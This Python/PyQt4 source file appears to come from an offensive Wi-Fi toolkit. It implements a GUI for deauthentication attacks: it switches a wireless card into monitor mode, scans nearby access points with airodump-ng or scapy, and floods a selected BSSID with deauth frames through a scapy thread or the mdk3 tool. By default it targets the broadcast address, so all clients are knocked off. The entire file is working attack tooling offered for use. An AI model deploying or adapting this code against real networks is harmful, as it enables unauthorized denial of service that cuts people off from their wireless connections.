#The MIT License (MIT)
#Copyright (c) 2015-2016 mh4x0f P0cL4bs Team
#Permission is hereby granted, free of charge, to any person obtaining a copy of
#this software and associated documentation files (the "Software"), to deal in
#the Software without restriction, including without limitation the rights to
#use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of
#the Software, and to permit persons to whom the Software is furnished to do so,
#subject to the following conditions:
#The above copyright notice and this permission notice shall be included in all
#copies or substantial portions of the Software.
#THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
#IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
#FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
#COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
#IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
#CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
import threading
from os import popen,path,makedirs
from re import search
from PyQt4.QtGui import *
from PyQt4.QtCore import *
from Core.config.Settings import frm_Settings
from Modules.utils import Refactor,ProcessThread,airdump_start,\
get_network_scan,set_monitor_mode,ThreadDeauth,ThreadScannerAP
threadloading = {'deauth':[],'mdk3':[]}


class frm_wifideauth(QMainWindow):
    def __init__(self, parent=None):
        super(frm_wifideauth, self).__init__(parent)
        self.form_widget = frm_deauth(self)
        self.setCentralWidget(self.form_widget)
        self.setWindowTitle("Deauth Attack wireless Route")
        self.setWindowIcon(QIcon('rsc/icon.ico'))
        self.config = frm_Settings()
        self.loadtheme(self.config.XmlThemeSelected())

    def loadtheme(self,theme):
        sshFile=("Core/%s.qss"%(theme))
        with open(sshFile,"r") as fh:
            self.setStyleSheet(fh.read())

    def closeEvent(self, event):
        global threadloading
        if len(threadloading['deauth']) != 0 or len(threadloading['mdk3']) != 0:
            reply = QMessageBox.question(self, 'About Exit',"Are you sure to quit?",
            QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
            if reply == QMessageBox.Yes:
                event.accept()
                for i in threadloading['deauth']:
                    i.terminate()
                    print("[*] Deuath Thread Terminate")
                for i in threadloading['mdk3']:
                    i.stop(),i.join()
                self.deleteLater()
                return
            event.ignore()


class frm_deauth(QWidget):
    def __init__(self, parent=None):
        super(frm_deauth, self).__init__(parent)
        self.Main           = QVBoxLayout()
        self.xmlcheck       = frm_Settings()
        self.interface      = self.xmlcheck.xmlSettings("interface", "monitor_mode", None, False)
        self.ApsCaptured    = {}
        self.data           = {'Bssid':[], 'Essid':[], 'Channel':[]}
        self.window_qt()

    def select_target(self):
        item = self.tables.selectedItems()
        if item != []:
            self.linetarget.setText(item[2].text())
            return
        self.linetarget.clear()

    def window_qt(self):
        self.mForm = QFormLayout()
        self.statusbar = QStatusBar()
        system = QLabel("Deauthentication::")
        self.statusbar.addWidget(system)
        self.Controlador = QLabel("")
        self.AttackStatus(False)

        self.tables = QTableWidget(5,3)
        self.tables.setFixedWidth(350)
        self.tables.setRowCount(100)
        self.tables.setFixedHeight(250)
        self.tables.setSelectionBehavior(QAbstractItemView.SelectRows)
        self.tables.setEditTriggers(QAbstractItemView.NoEditTriggers)
        self.tables.clicked.connect(self.select_target)
        self.tables.resizeColumnsToContents()
        self.tables.resizeRowsToContents()
        self.tables.horizontalHeader().resizeSection(1,120)
        self.tables.horizontalHeader().resizeSection(0,60)
        self.tables.horizontalHeader().resizeSection(2,158)
        self.tables.verticalHeader().setVisible(False)
        Headers = []
        for n, key in enumerate(self.data.keys()):
            Headers.append(key)
        self.tables.setHorizontalHeaderLabels(Headers)


        self.linetarget = QLineEdit(self)
        self.input_client = QLineEdit(self)
        self.input_client.setText("ff:ff:ff:ff:ff:ff")
        self.btn_enviar = QPushButton("Send Attack", self)
        self.btn_enviar.clicked.connect(self.attack_deauth)
        self.btn_scan_start = QPushButton("Start scan", self)
        self.btn_scan_start.clicked.connect(self.SettingsScan)
        self.btn_stop = QPushButton("Stop  Attack ", self)
        self.btn_stop.clicked.connect(self.kill_thread)
        self.btn_scan_stop = QPushButton('Stop scan',self)
        self.btn_scan_stop.clicked.connect(self.kill_scanAP)
        self.btn_enviar.setFixedWidth(170)
        self.btn_stop.setFixedWidth(170)
        self.btn_scan_stop.setEnabled(False)
        self.btn_stop.setEnabled(False)

        #icons
        self.btn_scan_start.setIcon(QIcon("rsc/network.png"))
        self.btn_scan_stop.setIcon(QIcon('rsc/network_off.png'))
        self.btn_enviar.setIcon(QIcon("rsc/start.png"))
        self.btn_stop.setIcon(QIcon("rsc/Stop.png"))


        self.get_placa = QComboBox(self)

        n = Refactor.get_interfaces()['all']
        for i,j in enumerate(n):
            if search("wlan", j):
                self.get_placa.addItem(n[i])

        #grid options
        self.Grid = QGridLayout()
        self.options_scan = self.xmlcheck.xmlSettings("scanner_AP", "select", None, False)

        self.Grid.addWidget(self.get_placa,0,1)
        self.Grid.addWidget(self.btn_scan_start,0,2)
        self.Grid.addWidget(self.btn_scan_stop,0,3)

        self.Grid.addWidget(QLabel("bssid:"),1,0)
        self.Grid.addWidget(QLabel("{0:>20}".format('Client:')),1,2)
        self.Grid.addWidget(self.linetarget,1,1)
        self.Grid.addWidget(self.input_client,1,3)


        self.form0  = QGridLayout()
        self.form0.addWidget(self.tables,0,0)

        self.mForm.addRow(self.btn_enviar, self.btn_stop)
        self.mForm.addRow(self.statusbar)
        self.Main.addLayout(self.form0)
        self.Main.addLayout(self.Grid)
        self.Main.addLayout(self.mForm)
        self.setLayout(self.Main)

    def scan_diveces_airodump(self):
        dirpath = "Settings/Dump"
        if not path.isdir(dirpath):
            makedirs(dirpath)
        self.data = {'Bssid':[], 'Essid':[], 'Channel':[]}
        exit_air = airdump_start(self.interface)
        self.fix = False
        if exit_air == None:
            self.cap = get_network_scan()
            if self.cap != None:
                for i in self.cap:
                    i = i.split("||")
                    if Refactor.check_is_mac(i[2]):
                        Headers = []
                        self.data['Channel'].append(i[0])
                        self.data['Essid'].append(i[1])
                        self.data['Bssid'].append(i[2])
                        for n, key in enumerate(self.data.keys()):
                            Headers.append(key)
                            for m, item in enumerate(self.data[key]):
                                item = QTableWidgetItem(item)
                                item.setTextAlignment(Qt.AlignVCenter | Qt.AlignCenter)
                                self.tables.setItem(m, n, item)
                    self.cap =[]

    def kill_scanAP(self):
        if hasattr(self,'thread_airodump'):popen('killall airodump-ng')
        if hasattr(self,'threadScanAP'):self.threadScanAP.stop()
        self.btn_scan_stop.setEnabled(False)
        self.btn_scan_start.setEnabled(True)

    def kill_thread(self):
        global threadloading
        for i in threadloading['deauth']:i.stop()
        for i in threadloading['mdk3']:
            i.stop(),i.join()
        self.btn_enviar.setEnabled(True)
        self.btn_stop.setEnabled(False)
        self.AttackStatus(False)

    def monitorThreadScan(self,apData):
        apData = list(apData.split('|'))
        if not str(apData[0]) in self.ApsCaptured.keys():
            self.ApsCaptured[str(apData[0])] = apData
            if Refactor.check_is_mac(str(apData[0])):
               self.data['Channel'].append(self.ApsCaptured[str(apData[0])][1])
               self.data['Essid'].append(self.ApsCaptured[str(apData[0])][2])
               self.data['Bssid'].append(str(apData[0]))
               Headers = []
               for n, key in enumerate(self.data.keys()):
                   Headers.append(key)
                   for m, item in enumerate(self.data[key]):
                       item = QTableWidgetItem(item)
                       item.setTextAlignment(Qt.AlignVCenter | Qt.AlignCenter)
                       self.tables.setItem(m, n, item)

    def SettingsScan(self):
        self.ApsCaptured    = {}
        self.data = {'Bssid':[], 'Essid':[], 'Channel':[]}
        if self.get_placa.currentText() == "":
            QMessageBox.information(self, "Network Adapter", 'Network Adapter Not found try again.')
        else:
            self.interface = str(set_monitor_mode(self.get_placa.currentText()).setEnable())
            self.xmlcheck.xmlSettings("interface", "monitor_mode", self.interface, False)
            self.btn_scan_stop.setEnabled(True)
            self.btn_scan_start.setEnabled(False)
            if self.interface != None:
                if self.options_scan == "scan_scapy":
                    self.threadScanAP = ThreadScannerAP(self.interface)
                    self.connect(self.threadScanAP,SIGNAL('Activated ( QString ) '), self.monitorThreadScan)
                    self.threadScanAP.setObjectName('Thread Scanner AP::scapy')
                    self.threadScanAP.start()
                else:
                    if path.isfile(popen('which airodump-ng').read().split("\n")[0]):
                        self.thread_airodump = threading.Thread(target=self.scan_diveces_airodump)
                        self.thread_airodump.daemon = True
                        self.thread_airodump.start()
                    else:
                        QMessageBox.information(self,'Error airodump','airodump-ng not installed')
                        set_monitor_mode(self.get_placa.currentText()).setDisable()


    def attack_deauth(self):
        global threadloading
        if hasattr(self,'threadScanAP'):
            if not self.threadScanAP.stopped:
                return QMessageBox.warning(self,'scanner','you need to stop the scanner Access Point')
        if hasattr(self,'thread_airodump'):
            if self.thread_airodump.isAlive():
                return QMessageBox.warning(self,'scanner','you need to stop the scanner Access Point')
        self.btn_stop.setEnabled(True)
        self.btn_enviar.setEnabled(False)
        if self.linetarget.text() == '':
            QMessageBox.information(self, 'Target Error', 'Please, first select Target for attack')
        else:
            self.bssid = str(self.linetarget.text())
            self.deauth_check = self.xmlcheck.xmlSettings('deauth', 'select',None,False)
            self.args = str(self.xmlcheck.xmlSettings('mdk3','arguments', None, False))
            self.interface = str(set_monitor_mode(self.get_placa.currentText()).setEnable())
            if self.deauth_check == 'packets_scapy':
                self.AttackStatus(True)
                threadDeauth = ThreadDeauth(self.bssid,str(self.input_client.text()),self.interface)
                threadloading['deauth'].append(threadDeauth)
                threadDeauth.setObjectName('Deauth scapy')
                threadDeauth.start()
            else:
                if path.isfile(popen('which mdk3').read().split("\n")[0]):
                    self.AttackStatus(True)
                    t = ProcessThread(('mdk3 %s %s %s'%(self.interface,self.args,self.bssid)).split())
                    t.name = 'Thread mdk3'
                    threadloading['mdk3'].append(t)
                    t.start()
                else:
                    QMessageBox.information(self,'Error mdk3','mkd3 not installed')
                    set_monitor_mode(self.get_placa.currentText()).setDisable()

    def AttackStatus(self,bool):
        if bool:
            self.Controlador.setText('[ON]')
            self.Controlador.setStyleSheet("QLabel {  color : green; }")
        else:
            self.Controlador.setText('[OFF]')
            self.Controlador.setStyleSheet("QLabel {  color : red; }")
        self.statusbar.addWidget(self.Controlador)

    @pyqtSlot(QModelIndex)
    def list_clicked(self, index):
        itms = self.list.selectedIndexes()
        for i in itms:
            attack = str(i.data().toString()).split()
            for i in attack:
                if Refactor.check_is_mac(i.replace(' ', '')):
                    self.linetarget.setText(str(i))
            if self.linetarget.text() == '':
                QMessageBox.information(self, 'MacAddress',
                'Error check the Mac Target, please set the mac valid.')
